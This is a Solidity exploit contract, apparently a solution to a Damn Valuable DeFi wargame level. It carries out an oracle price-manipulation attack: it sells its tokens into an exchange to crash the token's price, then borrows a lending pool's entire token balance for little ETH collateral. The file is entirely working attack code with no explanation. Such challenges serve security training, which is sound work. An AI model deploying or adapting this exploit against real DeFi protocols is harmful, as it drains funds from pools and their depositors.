// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../DamnValuableToken.sol";
import "hardhat/console.sol";

interface IEx {
    function ethToTokenTransferInput(uint256 min_tokens, uint256 deadline, address recipient) external payable;
    function tokenToEthTransferInput(uint256 tokens_sold ,uint256 min_eth,uint256 deadline ,address recipient) external;
    //function addLiquidity(uint256)
}

interface IPool {
    function borrow(uint256 amount, address recipient) external payable;
}


contract Attack {

    address owner;
    DamnValuableToken token;
    address exchange;
    address pool;

    constructor(address _token, address _exchange, address _pool) payable {
        owner = msg.sender;
        token = DamnValuableToken(_token);
        exchange = _exchange;
        pool = _pool;
        //attack();
    }

    function attack() public {
        //IEx(exchange).ethToTokenTransferInput(0, block.timestamp, msg.sender);
        token.approve(exchange, token.balanceOf(address(this)));

        IEx(exchange).tokenToEthTransferInput(token.balanceOf(address(this)), 1, block.timestamp, address(this));
        IPool(pool).borrow{value: address(this).balance}(token.balanceOf(pool), owner);
    }

    receive() external payable {}
}